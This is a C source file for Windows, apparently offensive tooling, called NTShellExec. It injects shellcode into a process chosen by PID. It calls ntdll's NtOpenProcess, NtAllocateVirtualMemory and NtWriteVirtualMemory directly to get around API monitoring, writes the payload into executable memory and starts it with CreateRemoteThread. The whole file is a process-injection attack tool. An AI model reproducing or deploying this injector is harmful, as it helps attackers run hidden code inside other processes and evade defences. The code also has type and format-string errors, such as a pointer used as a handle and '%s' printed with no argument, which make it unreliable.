#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include "utils.h"

int NTShellExec(DWORD process_id);

int main(int argc, char* argv[]){
    printf("Loading NTShellExec.... \n\n");

    if(argc == 1 || argc >= 3){
        printf("Select one argument <file.exe> -> PID");
        return EXIT_FAILURE;
    }

    //get pid
    DWORD PID = atoi(argv[1]);

    NTShellExec(PID);

    return EXIT_SUCCESS;
}

int NTShellExec(DWORD process_id){

    //NtOpenProcess
    PHANDLE hProcess = NULL;

    OBJECT_ATTRIBUTES OA           = { sizeof(OA), NULL };
    CLIENT_ID         CID          = { (HANDLE)process_id, NULL };

    LPNTOPENPROCESS ptrOpenProcess = (LPNTOPENPROCESS)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtOpenProcess");

    if(ptrOpenProcess == NULL){
        printf("unable to get ptr to NtOpenProcess with error : %zd\n", GetLastError());
        return EXIT_FAILURE;
    }

    NTSTATUS OpenProcess_status = ptrOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);

    if(OpenProcess_status != STATUS_SUCCESS){
        printf("unable to get handle to process...\n");
        goto CLEANUP;
    }


    //ptr to AllocateVirtualMemory
    LPNTALLOCATEVIRTUALMEMORY ptrAllocateVirtualMemory = (LPNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAllocateVirtualMemory");

    if(ptrAllocateVirtualMemory == NULL){
        printf("unable to get ptr to NtAllocateVirtualMemory with error : %zd\n", GetLastError());
        return EXIT_FAILURE;
    }

    //params
    PVOID rBuffer = NULL;
    PSIZE_T sizeShellCode = sizeof(shellcode_x64);

    //allocate memory buffer
    NTSTATUS AVMstatus = ptrAllocateVirtualMemory(hProcess, &rBuffer, NULL, &sizeShellCode, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if(AVMstatus != STATUS_SUCCESS){
        printf("unable to alloc memory...\n");
        goto CLEANUP;
    }


    //ptr to WriteVirtualMemory
    LPWRITEVIRTUALMEMORY ptrWriteVirtualMemory = (LPWRITEVIRTUALMEMORY)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtWriteVirtualMemory");

    if(ptrWriteVirtualMemory == NULL){
        printf("unable to get ptr to NtWriteVirtualMemory with error : %zd \n", GetLastError());
        return EXIT_FAILURE;
    }

    //write memory
    NTSTATUS WVMstatus = ptrWriteVirtualMemory(hProcess, rBuffer, shellcode_x64, (SIZE_T)(sizeof(shellcode_x64)), NULL);

    if(WVMstatus != STATUS_SUCCESS){
        printf("unable to write memory... \n");
        goto CLEANUP;
    }

    printf("wrote %zd-bytes to allocated process memory\n", sizeof(shellcode_x64));

    LPDWORD thread_id = NULL;

    //creating thread to run shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, thread_id);

    if(hThread == NULL){
        printf("unable to get handle to new thread with error : %ld", GetLastError());
        goto CLEANUP;
    }

    printf("%s waiting for thread to finish executing\n");
    WaitForSingleObject(hThread, INFINITE);
    printf("%s thread finished executing, cleaning up\n");
    goto CLEANUP;

CLEANUP:

	if (hThread) {
		printf("closing handle to thread\n");
		CloseHandle(hThread);
	}

	if (hProcess) {
		printf("closing handle to process\n");
		CloseHandle(hProcess);
	}

    printf("%s operation successfully made>>>>");
    return EXIT_SUCCESS;
}